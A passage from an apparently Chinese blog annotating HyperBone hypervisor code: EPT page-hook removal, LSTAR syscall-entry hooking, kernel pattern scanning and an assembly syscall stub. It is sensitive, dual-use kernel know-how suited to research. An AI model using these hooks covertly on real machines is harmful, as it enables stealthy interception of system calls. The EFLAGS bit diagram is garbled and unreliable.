SystemArgument2 );<span class="comment">// 发出同步信号</span></span><br><span class="line">    <span class="built_in">KeSignalCallDpcDone</span>( SystemArgument1 );<span class="comment">// 通知DPC执行完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解除页面钩子"><a href="#解除页面钩子" class="headerlink" title="解除页面钩子"></a>解除页面钩子</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Restore hooked function</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pFunc&quot;&gt;Function address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">PHRestore</span><span class="params">( IN PVOID pFunc )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 不支持执行保护，无法恢复</span></span><br><span class="line">    <span class="keyword">if</span> (!g_Data-&gt;Features.ExecOnlyEPT)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_SUPPORTED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取要恢复函数的PAGE_HOOK_ENTRY结构体</span></span><br><span class="line">    PPAGE_HOOK_ENTRY pHookEntry = <span class="built_in">PHGetHookEntry</span>( pFunc );</span><br><span class="line">    <span class="keyword">if</span> (pHookEntry == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复原始字节，根据页面钩子数量</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">PHPageHookCount</span>( pFunc, DATA_PAGE ) &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 存在其他CPU正在使用页面钩子，需要进行原子性的内存补丁操作</span></span><br><span class="line">        <span class="comment">// 将原始的字节数据从钩子页中复制回原始函数所在的页面。这样可以确保其他CPU在执行期间的一致性。</span></span><br><span class="line">        ULONG_PTR page_offset = (ULONG_PTR)pFunc - (ULONG_PTR)<span class="built_in">PAGE_ALIGN</span>( pFunc );</span><br><span class="line">        <span class="built_in">memcpy</span>( (PUCHAR)pHookEntry-&gt;CodePageVA + page_offset, pHookEntry-&gt;OriginalData, pHookEntry-&gt;OriginalSize );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 只被一个CPU钩子的函数，将钩子所在页面与原始函数所在的页面进行交换，以还原函数的内容</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        HOOK_CONTEXT ctx = &#123; <span class="number">0</span> &#125;;<span class="comment">// 临时HOOK_CONTEXT结构体</span></span><br><span class="line">        ctx.Hook = FALSE;</span><br><span class="line">        ctx.DataPagePFN = pHookEntry-&gt;DataPagePFN;</span><br><span class="line">        ctx.CodePagePFN = pHookEntry-&gt;CodePagePFN;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用Dpc回调Unhook模式</span></span><br><span class="line">        <span class="built_in">KeGenericCallDpc</span>( PHpHookCallbackDPC, &amp;ctx );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放钩子信息缓存</span></span><br><span class="line">    <span class="built_in">MmFreeContiguousMemory</span>( pHookEntry-&gt;CodePageVA );</span><br><span class="line">    <span class="built_in">RemoveEntryList</span>( &amp;pHookEntry-&gt;Link );</span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>( pHookEntry, HB_POOL_TAG );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="计算当前函数有多少个hook"><a href="#计算当前函数有多少个hook" class="headerlink" title="计算当前函数有多少个hook"></a>计算当前函数有多少个hook</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get number of hooks in one page</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ptr&quot;&gt;Function address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Type&quot;&gt;Page type&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Number of hooks&lt;/returns&gt;</span></span><br><span class="line"><span class="function">ULONG <span class="title">PHPageHookCount</span><span class="params">( IN PVOID ptr, IN PAGE_TYPE Type )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 检查是否为空</span></span><br><span class="line">    <span class="keyword">if</span> (g_PageList.Flink == <span class="literal">NULL</span> || <span class="built_in">IsListEmpty</span>( &amp;g_PageList ))</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取页面地址</span></span><br><span class="line">    PVOID page = <span class="built_in">PAGE_ALIGN</span>( ptr );</span><br><span class="line">    <span class="comment">// 遍历g_PageList查找匹配的PAGE_HOOK_ENTRY结构体</span></span><br><span class="line">    <span class="keyword">for</span> (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink)</span><br><span class="line">    &#123;</span><br><span class="line">        PPAGE_HOOK_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>( pListEntry, PAGE_HOOK_ENTRY, Link );</span><br><span class="line">        <span class="comment">// 判断钩子的页面类型、数据是否匹配</span></span><br><span class="line">        <span class="keyword">if</span> ((Type == DATA_PAGE &amp;&amp; pEntry-&gt;DataPageVA == page) || (Type == CODE_PAGE &amp;&amp; pEntry-&gt;CodePageVA == page))</span><br><span class="line">            count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="系统调用入口钩子"><a href="#系统调用入口钩子" class="headerlink" title="系统调用入口钩子"></a>系统调用入口钩子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Perform LSTAR hooking</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SHInitHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    LSTAR是一个MSR（Machine Specific Register），它保存了系统调用（system call）的入口地址，</span></span><br><span class="line"><span class="comment">    hooking LSTAR就可以实现对所有系统调用的监控和拦截。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有SSDT</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">UtilSSDTBase</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: SSDT base not found\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// KiSystemServiceCopyEnd</span></span><br><span class="line">    <span class="comment">// 这个函数用于将系统调用的参数从用户空间复制到内核空间并调用具体的系统调用处理函数</span></span><br><span class="line">    <span class="comment">// F7 05 ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? 0F 85 ? ? ? ? ? ? ? ? 41 FF D2</span></span><br><span class="line">    <span class="keyword">if</span> (KiServiceCopyEndPtr == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 搜索KiSystemServiceCopyEnd函数特征码找到地址</span></span><br><span class="line">        CHAR pattern[] = <span class="string">&quot;\xF7\x05\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x0F\x85\xcc\xcc\xcc\xcc\x41\xFF\xD2&quot;</span>;</span><br><span class="line">        status = <span class="built_in">UtilScanSection</span>( <span class="string">&quot;.text&quot;</span>, (PCUCHAR)pattern, <span class="number">0xCC</span>, <span class="built_in">sizeof</span>( pattern ) - <span class="number">1</span>, (PVOID)&amp;KiServiceCopyEndPtr );</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: KiSystemServiceCopyEnd not found\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hook LSTAR</span></span><br><span class="line">    <span class="keyword">if</span> (KiSystemCall64Ptr == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        KiSystemCall64Ptr = __readmsr( MSR_LSTAR );<span class="comment">// 原始LSTAR地址</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Something isn&#x27;t right</span></span><br><span class="line">        <span class="keyword">if</span> (KiSystemCall64Ptr == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在DPC回调中hook，修改LSTAR寄存器的值为SyscallEntryPoint定义的函数</span></span><br><span class="line">        <span class="built_in">KeGenericCallDpc</span>( SHpHookCallbackDPC, (PVOID)(ULONG_PTR)SyscallEntryPoint );</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在内核PE文件的指定section中查找指定的pattern"><a href="#在内核PE文件的指定section中查找指定的pattern" class="headerlink" title="在内核PE文件的指定section中查找指定的pattern"></a>在内核PE文件的指定section中查找指定的pattern</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Find pattern in kernel PE section</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;section&quot;&gt;Section name&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pattern&quot;&gt;Pattern data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;wildcard&quot;&gt;Pattern wildcard symbol&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;len&quot;&gt;Pattern length&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ppFound&quot;&gt;Found address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">UtilScanSection</span><span class="params">( IN PCCHAR section, IN PCUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, OUT PVOID* ppFound )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( ppFound != <span class="literal">NULL</span> );</span><br><span class="line">    <span class="keyword">if</span> (ppFound == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    PVOID base = <span class="built_in">UtilKernelBase</span>( <span class="literal">NULL</span> );<span class="comment">// 获取NTOS内核的基址</span></span><br><span class="line">    <span class="keyword">if</span> (!base)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line"></span><br><span class="line">    PIMAGE_NT_HEADERS64 pHdr = <span class="built_in">RtlImageNtHeader</span>( base );<span class="comment">// 获取NTOS内核的PE头</span></span><br><span class="line">    <span class="keyword">if</span> (!pHdr)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_IMAGE_FORMAT;</span><br><span class="line"></span><br><span class="line">    PIMAGE_SECTION_HEADER pFirstSection = (PIMAGE_SECTION_HEADER)(pHdr + <span class="number">1</span>);<span class="comment">// 获取NTOS内核的第一个节表</span></span><br><span class="line">    <span class="comment">// 遍历所有节表，进行模式匹配</span></span><br><span class="line">    <span class="keyword">for</span> (PIMAGE_SECTION_HEADER pSection = pFirstSection; pSection &lt; pFirstSection + pHdr-&gt;FileHeader.NumberOfSections; pSection++)</span><br><span class="line">    &#123;</span><br><span class="line">        ANSI_STRING s1, s2;</span><br><span class="line">        <span class="built_in">RtlInitAnsiString</span>( &amp;s1, section );</span><br><span class="line">        <span class="built_in">RtlInitAnsiString</span>( &amp;s2, (PCCHAR)pSection-&gt;Name );</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">RtlCompareString</span>( &amp;s1, &amp;s2, TRUE ) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">UtilSearchPattern</span>( pattern, wildcard, len, (PUCHAR)base + pSection-&gt;VirtualAddress, pSection-&gt;Misc.VirtualSize, ppFound );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LSTAR-Hook-回调函数"><a href="#LSTAR-Hook-回调函数" class="headerlink" title="LSTAR Hook 回调函数"></a>LSTAR Hook 回调函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Per-CPU LSTAR hook/unhook routine</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Dpc&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Context&quot;&gt;New LASTAR value if hooking, 0 if unhooking&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemArgument1&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemArgument2&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">SHpHookCallbackDPC</span><span class="params">( PRKDPC Dpc, PVOID Context, PVOID SystemArgument1, PVOID SystemArgument2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Dpc );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断Context确定hook或unhook操作，进行VMCALL调用</span></span><br><span class="line">    __vmx_vmcall( Context != <span class="literal">NULL</span> ? HYPERCALL_HOOK_LSTAR : HYPERCALL_UNHOOK_LSTAR, (ULONG64)Context, <span class="number">0</span>, <span class="number">0</span> );</span><br><span class="line">    <span class="built_in">KeSignalCallDpcSynchronize</span>( SystemArgument2 );<span class="comment">// 通知等待同步</span></span><br><span class="line">    <span class="built_in">KeSignalCallDpcDone</span>( SystemArgument1 );<span class="comment">// 通知DPC执行完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SyscallEntryPoint"><a href="#SyscallEntryPoint" class="headerlink" title="SyscallEntryPoint"></a>SyscallEntryPoint</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">EXTERN HookEnabled:DB</span><br><span class="line">EXTERN ArgTble:DB</span><br><span class="line">EXTERN HookTable:DQ</span><br><span class="line"></span><br><span class="line">EXTERN KiSystemCall64Ptr:DQ</span><br><span class="line">EXTERN KiServiceCopyEndPtr:DQ</span><br><span class="line"></span><br><span class="line">USERMD_STACK_GS = 10h</span><br><span class="line">KERNEL_STACK_GS = 1A8h</span><br><span class="line"></span><br><span class="line">MAX_SYSCALL_INDEX = 1000h</span><br><span class="line"></span><br><span class="line">.CODE</span><br><span class="line"></span><br><span class="line">; *********************************************************</span><br><span class="line">;</span><br><span class="line">; Determine if the specific syscall should be hooked</span><br><span class="line">;</span><br><span class="line">; if (SyscallHookEnabled[EAX &amp; 0xFFF] == TRUE)</span><br><span class="line">;     jmp KiSystemCall64_Emulate</span><br><span class="line">; else (fall-through)</span><br><span class="line">;     jmp KiSystemCall64</span><br><span class="line">;</span><br><span class="line">; *********************************************************</span><br><span class="line">SyscallEntryPoint PROC</span><br><span class="line">    ;cli                                    ; Disable interrupts</span><br><span class="line">    swapgs                                  ; 将GS寄存器切换为内核PCR</span><br><span class="line">    mov         gs:[USERMD_STACK_GS], rsp   ; 将当前用户栈保存，以便调用返回时恢复</span><br><span class="line"></span><br><span class="line">    cmp         rax, MAX_SYSCALL_INDEX      ; 检查rax寄存器的值是否大于系统调用数组的大小</span><br><span class="line">    jge         KiSystemCall64              ; 大于，表示该调用不存在，跳转到KiSystemCall64</span><br><span class="line"></span><br><span class="line">    lea         rsp, offset HookEnabled     ; 检查Hook是否被启用</span><br><span class="line">    cmp         byte ptr [rsp + rax], 0     ; 检查Hook是否被启用</span><br><span class="line">    jne         KiSystemCall64_Emulate      ; 跳转进行KiSystemCall64_Emulate，否则进行KiSystemCall64</span><br><span class="line">SyscallEntryPoint ENDP</span><br><span class="line"></span><br><span class="line">; *********************************************************</span><br><span class="line">;</span><br><span class="line">; 返回到原始NTOSKRNL系统调用处理程序</span><br><span class="line">; (Restore all old registers first)</span><br><span class="line">;</span><br><span class="line">; *********************************************************</span><br><span class="line">KiSystemCall64 PROC</span><br><span class="line">mov         rsp, gs:[USERMD_STACK_GS]   ; 取出用户模式RSP加载到RSP，切换到用户模式栈</span><br><span class="line">swapgs                                  ; 切换到用户模式GS寄存器，恢复原先寄存器</span><br><span class="line">jmp         [KiSystemCall64Ptr]         ; 跳转到KiSystemCall64Ptr所指向的地址，64位指针</span><br><span class="line">KiSystemCall64 ENDP</span><br><span class="line"></span><br><span class="line">; *********************************************************</span><br><span class="line">;</span><br><span class="line">; 在SYSCALL之后直接执行的例程</span><br><span class="line">; (See: MSR_LSTAR)</span><br><span class="line">;</span><br><span class="line">; *********************************************************</span><br><span class="line">KiSystemCall64_Emulate PROC</span><br><span class="line">    ; NOTE:</span><br><span class="line">    ; First 2 lines are included in SyscallEntryPoint</span><br><span class="line"></span><br><span class="line">    mov         rsp, gs:[KERNEL_STACK_GS]   ; 加载内核模式RSP</span><br><span class="line">    push        2Bh                         ; push 虚拟的SS选择子</span><br><span class="line">    push        qword ptr gs:[10h]          ; push 用户模式栈指针</span><br><span class="line">    push        r11                         ; push 先前的 EFLAGS</span><br><span class="line">    push        33h                         ; push 虚拟 64位 CS 选择子</span><br><span class="line">    push        rcx                         ; push 返回地址</span><br><span class="line">    mov         rcx, r10                    ; 在rcx中保存第一个参数</span><br><span class="line"></span><br><span class="line">    sub         rsp, 8h                     ; 分配8字节作为虚拟错误码</span><br><span class="line">    push        rbp                         ; 保存标准寄存器的值</span><br><span class="line">    sub         rsp, 158h                   ; 分配一个固定大小的框架</span><br><span class="line">    lea         rbp, [rsp+80h]              ; 设置RBP为当前帧的基地址</span><br><span class="line">    mov         [rbp+0C0h], rbx             ; 保存一些非易失性的寄存器的值</span><br><span class="line">    mov         [rbp+0C8h], rdi             ;</span><br><span class="line">    mov         [rbp+0D0h], rsi             ;</span><br><span class="line">    mov         byte ptr [rbp-55h], 2h      ; 标志位，表示服务活动</span><br><span class="line">    mov         rbx, gs:[188h]              ; 获取当前线程地址</span><br><span class="line">    prefetchw   byte ptr [rbx+90h]          ; 对线程地址进行预取操作</span><br><span class="line">    stmxcsr     dword ptr [rbp-54h]         ; 保存当前MXCSR</span><br><span class="line">    ldmxcsr     dword ptr gs:[180h]         ; 设置默认MXCSR</span><br><span class="line">    cmp         byte ptr [rbx+3], 0         ; 检查调试是否启用</span><br><span class="line">    mov         word ptr [rbp+80h], 0       ; 如果调试未启用</span><br><span class="line">    jz          KiSS05                      ; 跳转到KiSS05标签处</span><br><span class="line">    mov         [rbp-50h], rax              ; 保存服务参数寄存器</span><br><span class="line">    mov         [rbp-48h], rcx              ;</span><br><span class="line">    mov         [rbp-40h], rdx              ;</span><br><span class="line">    mov         [rbp-38h], r8               ;</span><br><span class="line">    mov         [rbp-30h], r9               ;</span><br><span class="line"></span><br><span class="line">    int         3                           ; 触发一个中断</span><br><span class="line">    align       10h</span><br><span class="line"></span><br><span class="line">    KiSS05:</span><br><span class="line">    ;sti                                    ; 启动中断</span><br><span class="line">    mov         [rbx+88h], rcx</span><br><span class="line">    mov         [rbx+80h], eax</span><br><span class="line"></span><br><span class="line">KiSystemCall64_Emulate ENDP</span><br></pre></td></tr></table></figure><h4 id="EFLAGS"><a href="#EFLAGS" class="headerlink" title="EFLAGS"></a>EFLAGS</h4><p>EFLAGS是x86架构中特有的寄存器，用于存储和控制处理器的状态标志位（flags）。它记录了CPU执行指令过程中产生的各种状态信息。</p><p>EFLAGS寄存器的位布局如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">31      23           15          7    0</span><br><span class="line">┌───────┬───────────┬───────────┬────┐</span><br><span class="line">|       |           |           |    |</span><br><span class="line">|  RFU  |  VM, VIP  |  ID, VIP  |  AC  |</span><br><span class="line">|       |           |           |    |</span><br><span class="line">└───────┴───────────┴───────────┴────┘</span><br></pre></td></tr></table></figure><p>各个标志位的含义如下：</p><ul><li>AC (Alignment Check)：对齐检查标志位，用于检测内存操作的对齐情况。</li><li>ID (ID Flag)：识别标志位，用于表示CPU是否支持CPUID指令。</li><li>VIP (Virtual Interrupt Pending)：虚拟中断挂起标志位，在虚拟8086模式下使用。</li><li>VIF (Virtual Interrupt Flag)：虚拟中断标志位，在虚拟8086模式下使用。</li><li>OF (Overflow Flag)：溢出标志位，用于检测有符号整数运算结果是否溢出。</li><li>DF (Direction Flag)：方向标志位，用于控制字符串操作指令的方向。</li><li>IF (Interrupt Flag)：中断标志位，用于控制CPU是否响应外部中断。</li><li>TF (Trap Flag)：陷阱标志位，用于控制CPU是否进入单步执行模式。</li><li>SF (Sign Flag)：符号标志位，用于表示有符号整数运算结果的符号。</li><li>ZF (Zero Flag)：零标志位，用于表示算术或逻辑运算结果是否为零。</li><li>AF (Auxiliary Carry Flag)：辅助进位标志位，用于检测无符号整数运算时的进位情况。</li><li>PF (Parity Flag)：奇偶标志位，用于表示运算结果的低8位中1的个数的奇偶性。</li><li>CF (Carry Flag)：进位标志位，用于检测无符号整数运算结果是否产生进位。</li></ul><p>这些标志位的状态可以通过指令读取或修改，用于判断和控制程序的执行流程。例如，通过检查ZF标志位可以判断某个运算结果是否为零，从而进行条件分支或循环的控制。</p><h4 id="MXCSR"><a href="#MXCSR" class="headerlink" title="MXCSR"></a>MXCSR</h4><p>MXCSR是x86架构中的一种控制寄存器，全称为”Floating-Point Control and Status Register”，它用于管理和控制浮点运算的行为和状态。</p><p>MXCSR寄存器是一个32位的寄存器，其位布局如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copy Code31        15       7      0</span><br><span 